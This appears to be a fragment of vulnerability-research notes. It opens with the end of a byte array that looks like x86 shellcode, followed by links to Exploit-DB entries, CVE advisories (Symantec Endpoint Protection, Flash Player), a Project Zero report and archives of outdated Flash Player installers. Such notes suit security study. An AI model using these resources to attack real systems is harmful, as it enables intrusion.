0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0xFF, 0x75, 0x28, 0xFF, 0x55, 0x10 }

https://gist.github.com/enigma0x3/5dbb9a72b592992b27dd703edb4c20b1

https://www.exploit-db.com/exploits/34272

https://github.com/v-p-b/cve-2019-12750/tree/master/CVE-2019-12750

https://labs.nettitude.com/blog/cve-2019-12750-symantec-endpoint-protection-local-privilege-escalation-part-1/

https://www.exploit-db.com/exploits/34272

https://nvd.nist.gov/vuln/detail/CVE-2015-3104

https://www.exploit-db.com/exploits/50290

https://bugs.chromium.org/p/project-zero/issues/detail?id=323&can=1&q=Shader

https://www.neowin.net/software/adobe-flash-player-1700188/

https://www.neowin.net/software/adobe-flash-player-1600287/

https://helpx.adobe.com/flash-player.html/

https://www.pcworld.pl/ftp/pobierz/pc/116840.html

https://www.techspot.com/downloads/5418-adobe-flash-player-uninstaller.html

http://www.quero.at/news.php?id=79#:~:text=The%20tablet%20version%20of%20IE11,processes%20for%20Enhanced%20Protected%20Mode%22.

https://www.jpcert.or.jp/english/at/2015/at150017.html

https://notepad.patheticcockroach.com/4029/flash-player-12-for-portable-browsers-32-and-64-bits/comment-page-1/

https://dl.bobpony.com/software/flashplayer/archives/

https://mirror.kraski.tv/soft/adobe_flash/archive/

https://archive.org/download/flashplayerarchive/pub/flashplayer/installers/archive/

https://archive.org/details/Adobe_Flash_Player_Complete_Collection

https://archive.org/details/adobe_flash_player_10.1.102.64

google archive.org adobe flash player
